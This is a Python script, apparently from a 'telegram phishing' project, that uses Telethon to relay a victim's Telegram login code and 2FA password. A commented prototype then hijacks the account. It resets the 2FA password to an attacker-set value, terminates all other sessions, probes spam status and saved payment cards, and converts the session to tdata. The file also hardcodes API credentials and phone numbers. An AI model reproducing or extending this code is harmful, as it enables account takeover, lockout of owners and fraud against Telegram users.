from telethon import TelegramClient
from telethon import functions, types
import telethon
import asyncio
from telethon.tl.types import InputPeerSelf
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.messages import GetHistoryRequest
from telethon.tl.functions.payments import GetPaymentReceiptRequest
import requests
from logger import logger

#Tdata to session

#async def main2():
#    from opentele.td import TDesktop
#    from opentele.tl import TelegramClient
#    from opentele.api import API, 3 UseCurrentSession, CreateNewSession
#
#    client = TelegramClient("anon.session")
#    tdesk = await client.ToTDesktop(flag=UseCurrentSession, password="1234qw1234qw@@")
#    tdesk.SaveTData("C:\\проекты\\телеграмфиш\\tdata")


# Use your own values here

class ClientTelegram:
    class NeedPassword(Exception):
        pass

    class InvalidPassword(Exception):
        pass

    class InvalidCode(Exception):
        pass

    @classmethod
    async def create(self, phone_number, api_id, api_hash):
        while True:
            try:
                client = TelegramClient(phone_number, api_id, api_hash)
                break
            except Exception as e:
                logger.error(f"{phone_number} | client create class exception: {e}")
        try:
            await client.connect()
        except Exception as e:
            logger.error(f"{phone_number} | client connect exception: {e}")

        attempt = ""
        try:
            attempt = await client.send_code_request(phone_number)
        except Exception as e:
            logger.error(f"{phone_number} | client send code error: {e}")
            await client.disconnect()
            raise Exception("Rait limite")

        self = {}
        self["phone_number"] = phone_number
        self["client"] = client
        self["hash"] = attempt.phone_code_hash
        
        return ClientTelegram(self)

    def __init__(self, options):
        self.client = options["client"]
        self.phone_number = options["phone_number"]
        self.hash = options["hash"]

    async def enter_code(self, code):
        try:
            await self.client.sign_in(self.phone_number, code=code, phone_code_hash=self.hash)
            return {"success": True}
        except telethon.errors.rpcerrorlist.PhoneCodeInvalidError:
            raise ClientTelegram.InvalidCode
        except SessionPasswordNeededError:
            raise ClientTelegram.NeedPassword

    async def enter_password(self, password):
        try:
            await self.client.sign_in(password=password, phone_code_hash=self.hash)
            return {"success": True}
        except telethon.errors.rpcerrorlist.PasswordHashInvalidError:
            raise ClientTelegram.InvalidPassword


#Рабочая версия

async def main3():
    client_authorization = await ClientTelegram.create("+92 320 707 1997", 17344245, '4003557c6a1afc8774a712fb2afd7950')
    
    print(client_authorization.phone_number)

    code = input("Code: ")
    try:
        await client_authorization.enter_code(code)
    except ClientTelegram.InvalidCode:
        print("invalid code")
        return
    except ClientTelegram.NeedPassword:
        password = input("Password: ")
        await client_authorization.enter_password(password)

    client = client_authorization.client
    client_info = await client.get_entity(InputPeerSelf())

    print(client_info)

#Прототип

#async def main():
#    api_id = 17344245
#    api_hash = '4003557c6a1afc8774a712fb2afd7950'
#
#    print("lol")
#
#    client = TelegramClient('anon', api_id, api_hash)
#
#    await client.connect()
#
#    user_authorized = await client.is_user_authorized()
#
#    if not user_authorized:
#        phone_number = "+79017403629"
#        await client.send_code_request(phone_number)
#
#        me = ""
#
#        d = True
#
#        while d:
#            try:
#                me = await client.sign_in(phone_number, input('Enter code: '))
#
#                d = False
#
#                await client.edit_2fa(new_password='1234qw1234qw@@')
#                break
#            except telethon.errors.rpcerrorlist.PhoneCodeInvalidError:
#                continue
#            except SessionPasswordNeededError:
#                d = False
#                while True:
#                    try:
#                        password = input('Enter password: ')
#                        await client.sign_in(password=password)
#                        await client.edit_2fa(current_password=password, new_password='')
#                        await client.edit_2fa(new_password='1234qw1234qw@@')
#
#                        break
#                    except telethon.errors.rpcerrorlist.PasswordHashInvalidError:
#                        continue
#
#    user_authorized = await client.is_user_authorized()
#
#    if user_authorized:
#        GetSessions = await client(functions.account.GetAuthorizationsRequest()) 
#        if len(GetSessions.authorizations) > 5:
#            for ss in GetSessions.authorizations:
#                SessionHash = ss.hash
#                SessionIp = ss.ip
#
#                if ss.current:
#                    print("bot session")
#                    continue
#
#                print("lol1")
#
#                result = await client(functions.account.ResetAuthorizationRequest(hash=SessionHash))
#                print("Session Killed     :\t" + str(SessionIp))
#        else:
#            print("Все сессии уже убиты")
#
#    dialogs = await client.get_dialogs(limit=200)
#
#    client_info = await client.get_entity(InputPeerSelf())
#
#    await client.send_message('@SpamBot', '/start')
#
#    entity = await client.get_entity('@SpamBot')
#
#    messages = await client(GetHistoryRequest(entity, limit=1, offset_date=None,offset_id=0,max_id=0,min_id=0,add_offset=0,hash=0))
#    message = messages.messages[0].message
#
#    spamblock = False
#    if message.find("UTC") != -1:
#        spamblock = True
#    
#    print(f"id - {client_info.id}")
#    print(f"Names - {client_info.first_name} {client_info.last_name}")
#    print(f"Phone - {client_info.phone}")
#    print(f"Premium - {client_info.premium}")
#    print(f"Dialogs Count - {len(dialogs)}")
#    print(f"Spamblock - {spamblock}")
#
#    result = await client(functions.payments.GetSavedInfoRequest())
#    print(f"Cards - {result.has_saved_credentials}")

if __name__ == "__main__":
    asyncio.run(main3())